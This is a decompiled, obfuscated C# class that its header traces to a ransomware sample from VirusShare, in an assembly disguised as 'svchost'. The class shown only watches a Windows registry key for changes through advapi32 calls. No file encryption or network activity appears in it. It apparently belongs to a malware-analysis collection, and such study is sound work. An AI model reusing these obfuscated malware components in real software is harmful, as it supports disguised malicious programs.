// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

[ComVisible(true)]
public sealed class \u0003\u2002 : IDisposable
{
  private static readonly IntPtr \u0002 = new IntPtr(int.MinValue);
  private static readonly IntPtr \u0003 = new IntPtr(-2147483647);
  private static readonly IntPtr \u0005 = new IntPtr(-2147483646);
  private static readonly IntPtr \u0008 = new IntPtr(-2147483645);
  private static readonly IntPtr \u0006 = new IntPtr(-2147483644);
  private static readonly IntPtr \u000E = new IntPtr(-2147483643);
  private static readonly IntPtr \u000F = new IntPtr(-2147483642);
  private EventHandler \u0002\u2000;
  private ErrorEventHandler \u0003\u2000;
  private IntPtr \u0005\u2000;
  private string \u0008\u2000;
  private object \u0006\u2000 = new object();
  private Thread \u000E\u2000;
  private bool \u000F\u2000 = false;
  private ManualResetEvent \u0002\u2001 = new ManualResetEvent(false);
  private \u0005\u2002 \u0003\u2001 = (\u0005\u2002) 15;

  public \u0003\u2002(RegistryKey _param1) => this.\u0002(_param1.Name);

  public \u0003\u2002(string _param1)
  {
    switch (_param1)
    {
      case "":
      case null:
        throw new ArgumentNullException(\u0005\u2003.\u0002(1067761242));
      default:
        this.\u0002(_param1);
        break;
    }
  }

  public \u0003\u2002(RegistryHive _param1, string _param2) => this.\u0002(_param1, _param2);

  [DllImport("advapi32.dll", SetLastError = true)]
  private static extern int RegOpenKeyEx(
    IntPtr _param0,
    string _param1,
    uint _param2,
    int _param3,
    out IntPtr _param4);

  [DllImport("advapi32.dll", SetLastError = true)]
  private static extern int RegNotifyChangeKeyValue(
    IntPtr _param0,
    bool _param1,
    \u0005\u2002 _param2,
    IntPtr _param3,
    bool _param4);

  [DllImport("advapi32.dll", SetLastError = true)]
  private static extern int RegCloseKey(IntPtr _param0);

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0002(EventHandler _param1) => this.\u0002\u2000 += _param1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0003(EventHandler _param1) => this.\u0002\u2000 -= _param1;

  protected virtual void \u0003\u2002\u2002​\u0002()
  {
    EventHandler eventHandler = this.\u0002\u2000;
    if (eventHandler == null)
      return;
    eventHandler((object) this, (EventArgs) null);
  }

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0002(ErrorEventHandler _param1) => this.\u0003\u2000 += _param1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0003(ErrorEventHandler _param1) => this.\u0003\u2000 -= _param1;

  protected virtual void \u0003\u2002\u2002​\u0002(Exception _param1)
  {
    ErrorEventHandler errorEventHandler = this.\u0003\u2000;
    if (errorEventHandler == null)
      return;
    errorEventHandler((object) this, new ErrorEventArgs(_param1));
  }

  public void Dispose()
  {
    this.\u0005();
    this.\u000F\u2000 = true;
    GC.SuppressFinalize((object) this);
  }

  public \u0005\u2002 \u0002() => this.\u0003\u2001;

  public void \u0002(\u0005\u2002 _param1)
  {
    lock (this.\u0006\u2000)
    {
      if (this.\u0002())
        throw new InvalidOperationException(\u0005\u2003.\u0002(1067761327));
      this.\u0003\u2001 = _param1;
    }
  }

  private void \u0002(RegistryHive _param1, string _param2)
  {
    switch (_param1)
    {
      case RegistryHive.ClassesRoot:
        this.\u0005\u2000 = \u0003\u2002.\u0002;
        break;
      case RegistryHive.CurrentUser:
        this.\u0005\u2000 = \u0003\u2002.\u0003;
        break;
      case RegistryHive.LocalMachine:
        this.\u0005\u2000 = \u0003\u2002.\u0005;
        break;
      case RegistryHive.Users:
        this.\u0005\u2000 = \u0003\u2002.\u0008;
        break;
      case RegistryHive.PerformanceData:
        this.\u0005\u2000 = \u0003\u2002.\u0006;
        break;
      case RegistryHive.CurrentConfig:
        this.\u0005\u2000 = \u0003\u2002.\u000E;
        break;
      case RegistryHive.DynData:
        this.\u0005\u2000 = \u0003\u2002.\u000F;
        break;
      default:
        throw new InvalidEnumArgumentException(\u0005\u2003.\u0002(1067761280), (int) _param1, typeof (RegistryHive));
    }
    this.\u0008\u2000 = _param2;
  }

  private void \u0002(string _param1)
  {
    string[] strArray = _param1.Split('\\');
    \u0005\u2003.\u0002(1067761301);
    \u0005\u2003.\u0002(1067761405);
    \u0005\u2003.\u0002(1067761398);
    \u0005\u2003.\u0002(1067761374);
    \u0005\u2003.\u0002(1067761363);
    \u0005\u2003.\u0002(1067761466);
    \u0005\u2003.\u0002(1067761423);
    \u0005\u2003.\u0002(1067761438);
    string str1;
    if ((str1 = strArray[0]) != null)
    {
      string str2 = string.IsInterned(str1);
      if ((object) str2 != (object) \u0005\u2003.\u0002(1067761301) && (object) str2 != (object) \u0005\u2003.\u0002(1067761405))
      {
        if ((object) str2 != (object) \u0005\u2003.\u0002(1067761398) && (object) str2 != (object) \u0005\u2003.\u0002(1067761374))
        {
          if ((object) str2 != (object) \u0005\u2003.\u0002(1067761363) && (object) str2 != (object) \u0005\u2003.\u0002(1067761466))
          {
            if ((object) str2 != (object) \u0005\u2003.\u0002(1067761423))
            {
              if ((object) str2 == (object) \u0005\u2003.\u0002(1067761438))
                this.\u0005\u2000 = \u0003\u2002.\u000E;
              else
                goto label_11;
            }
            else
              this.\u0005\u2000 = \u0003\u2002.\u0008;
          }
          else
            this.\u0005\u2000 = \u0003\u2002.\u0005;
        }
        else
          this.\u0005\u2000 = \u0003\u2002.\u0003;
      }
      else
        this.\u0005\u2000 = \u0003\u2002.\u0002;
      this.\u0008\u2000 = string.Join(\u0005\u2003.\u0002(1067755254), strArray, 1, strArray.Length - 1);
      return;
    }
label_11:
    this.\u0005\u2000 = IntPtr.Zero;
    throw new ArgumentException(\u0005\u2003.\u0002(1067761504) + strArray[0] + \u0005\u2003.\u0002(1067761482), \u0005\u2003.\u0002(1067761581));
  }

  public bool \u0002() => this.\u000E\u2000 != null;

  public void \u0003()
  {
    if (this.\u000F\u2000)
      throw new ObjectDisposedException((string) null, \u0005\u2003.\u0002(1067761569));
    lock (this.\u0006\u2000)
    {
      if (this.\u0002())
        return;
      this.\u0002\u2001.Reset();
      this.\u000E\u2000 = new Thread(new ThreadStart(this.\u0008));
      this.\u000E\u2000.IsBackground = true;
      this.\u000E\u2000.Start();
    }
  }

  public void \u0005()
  {
    if (this.\u000F\u2000)
      throw new ObjectDisposedException((string) null, \u0005\u2003.\u0002(1067761569));
    lock (this.\u0006\u2000)
    {
      Thread thread = this.\u000E\u2000;
      if (thread == null)
        return;
      this.\u0002\u2001.Set();
      thread.Join();
    }
  }

  private void \u0008()
  {
    try
    {
      this.\u0006();
    }
    catch (Exception ex)
    {
      this.\u0003\u2002\u2002​\u0002(ex);
    }
    this.\u000E\u2000 = (Thread) null;
  }

  private void \u0006()
  {
    IntPtr num;
    int error1 = \u0003\u2002.RegOpenKeyEx(this.\u0005\u2000, this.\u0008\u2000, 0U, 131089, out num);
    if (error1 != 0)
      throw new Win32Exception(error1);
    try
    {
      AutoResetEvent autoResetEvent = new AutoResetEvent(false);
      WaitHandle[] waitHandles = new WaitHandle[2]
      {
        (WaitHandle) autoResetEvent,
        (WaitHandle) this.\u0002\u2001
      };
      while (!this.\u0002\u2001.WaitOne(0, true))
      {
        int error2 = \u0003\u2002.RegNotifyChangeKeyValue(num, true, this.\u0003\u2001, autoResetEvent.Handle, true);
        if (error2 != 0)
          throw new Win32Exception(error2);
        if (WaitHandle.WaitAny(waitHandles) == 0)
          this.\u0003\u2002\u2002​\u0002();
      }
    }
    finally
    {
      if (num != IntPtr.Zero)
        \u0003\u2002.RegCloseKey(num);
    }
  }
}
